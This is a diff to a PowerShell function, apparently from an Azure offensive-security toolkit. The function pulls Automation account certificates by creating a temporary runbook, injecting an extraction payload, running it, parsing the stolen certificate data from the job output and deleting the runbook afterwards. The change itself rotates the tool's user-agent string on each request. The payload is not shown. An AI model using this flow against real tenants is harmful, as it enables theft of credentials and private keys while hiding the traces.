@@ -105,7 +105,7 @@ function Get-AutomationCertificateKey {
                 # Automation sub-resources (certificates, variables, credentials) are child assets not indexed in ARG
                 $certsUri = "{0}{1}/certificates?api-version=2020-01-13-preview" -f $sv.armUri, $accId
                 try {
-                    $certResponse = Invoke-RestMethod -Uri $certsUri -Headers $auth -Method GET -UserAgent $sv.userAgent
+                    $certResponse = Invoke-RestMethod -Uri $certsUri -Headers $auth -Method GET -UserAgent (Get-CurrentUserAgent -IncrementCount)
                     $certs = $certResponse.value
                 }
                 catch {
@@ -145,7 +145,7 @@ function Get-AutomationCertificateKey {
                             }
                         } | ConvertTo-Json
 
-                        Invoke-RestMethod -Uri $createRbUri -Headers $auth -Method PUT -Body $createRbBody -ContentType 'application/json' -UserAgent $sv.userAgent | Out-Null
+                        Invoke-RestMethod -Uri $createRbUri -Headers $auth -Method PUT -Body $createRbBody -ContentType 'application/json' -UserAgent (Get-CurrentUserAgent -IncrementCount) | Out-Null
                         $runbookCreated = $true
 
                         # Prepare and upload certificate extraction payload into draft
@@ -230,14 +230,14 @@ Write-Output "===BLACKCAT_CERTS_START===`$json===BLACKCAT_CERTS_END==="
 
                         Write-Host "  [+] Uploading payload to runbook draft..." -ForegroundColor White
                         $draftUri = "{0}{1}/runbooks/{2}/draft/content?api-version=2018-06-30" -f $sv.armUri, $accId, $tempRunbook
-                        Invoke-RestMethod -Uri $draftUri -Headers $auth -Method PUT -Body $injectionPayload -ContentType 'text/plain' -UserAgent $sv.userAgent | Out-Null
+                        Invoke-RestMethod -Uri $draftUri -Headers $auth -Method PUT -Body $injectionPayload -ContentType 'text/plain' -UserAgent (Get-CurrentUserAgent -IncrementCount) | Out-Null
 
                         # Wait for async draft update (202 Accepted) to complete provisioning
                         Start-Sleep -Seconds 3
 
                         Write-Host "  [+] Publishing runbook..." -ForegroundColor White
                         $publishUri = "{0}{1}/runbooks/{2}/publish?api-version=2018-06-30" -f $sv.armUri, $accId, $tempRunbook
-                        Invoke-RestMethod -Uri $publishUri -Headers $auth -Method POST -UserAgent $sv.userAgent | Out-Null
+                        Invoke-RestMethod -Uri $publishUri -Headers $auth -Method POST -UserAgent (Get-CurrentUserAgent -IncrementCount) | Out-Null
 
                         # Wait for publishing to complete before starting job
                         Start-Sleep -Seconds 3
@@ -248,7 +248,7 @@ Write-Output "===BLACKCAT_CERTS_START===`$json===BLACKCAT_CERTS_END==="
                         $startJobUri = "{0}{1}/jobs/{2}?api-version=2019-06-01" -f $sv.armUri, $accId, $jobId
                         $jobBody = @{ properties = @{ runbook = @{ name = $tempRunbook } } } | ConvertTo-Json
 
-                        Invoke-RestMethod -Uri $startJobUri -Headers $auth -Method PUT -Body $jobBody -ContentType 'application/json' -UserAgent $sv.userAgent | Out-Null
+                        Invoke-RestMethod -Uri $startJobUri -Headers $auth -Method PUT -Body $jobBody -ContentType 'application/json' -UserAgent (Get-CurrentUserAgent -IncrementCount) | Out-Null
 
                         # Poll for job completion
                         $jobStatusUri = "{0}{1}/jobs/{2}?api-version=2019-06-01" -f $sv.armUri, $accId, $jobId
@@ -256,7 +256,7 @@ Write-Output "===BLACKCAT_CERTS_START===`$json===BLACKCAT_CERTS_END==="
                         $pollCount = 0
                         while (-not $completed -and $pollCount -lt 30) {
                             Start-Sleep -Seconds 4
-                            $jobStatus = Invoke-RestMethod -Uri $jobStatusUri -Headers $auth -Method GET -UserAgent $sv.userAgent
+                            $jobStatus = Invoke-RestMethod -Uri $jobStatusUri -Headers $auth -Method GET -UserAgent (Get-CurrentUserAgent -IncrementCount)
                             $status = $jobStatus.properties.status
                             Write-Verbose "Job status: $status"
                             if ($status -in @('Completed', 'Failed', 'Suspended', 'Stopped')) {
@@ -267,7 +267,7 @@ Write-Output "===BLACKCAT_CERTS_START===`$json===BLACKCAT_CERTS_END==="
 
                         # Retrieve job stream output
                         $jobOutputUri = "{0}{1}/jobs/{2}/output?api-version=2019-06-01" -f $sv.armUri, $accId, $jobId
-                        $jobOutput = Invoke-RestMethod -Uri $jobOutputUri -Headers $auth -Method GET -UserAgent $sv.userAgent
+                        $jobOutput = Invoke-RestMethod -Uri $jobOutputUri -Headers $auth -Method GET -UserAgent (Get-CurrentUserAgent -IncrementCount)
 
                         if ($jobOutput -match '===BLACKCAT_CERTS_START===(.*)===BLACKCAT_CERTS_END===') {
                             $extractedJson = $Matches[1].Trim()
@@ -317,7 +317,7 @@ Write-Output "===BLACKCAT_CERTS_START===`$json===BLACKCAT_CERTS_END==="
                             while (-not $deleted -and $retryDelete -lt 4) {
                                 Start-Sleep -Seconds 5
                                 try {
-                                    Invoke-RestMethod -Uri $deleteRbUri -Headers $auth -Method DELETE -UserAgent $sv.userAgent | Out-Null
+                                    Invoke-RestMethod -Uri $deleteRbUri -Headers $auth -Method DELETE -UserAgent (Get-CurrentUserAgent -IncrementCount) | Out-Null
                                     $deleted = $true
                                     $stats.CleanedUp++
                                     Write-Host "  [+] Ephemeral runbook deleted successfully." -ForegroundColor Green
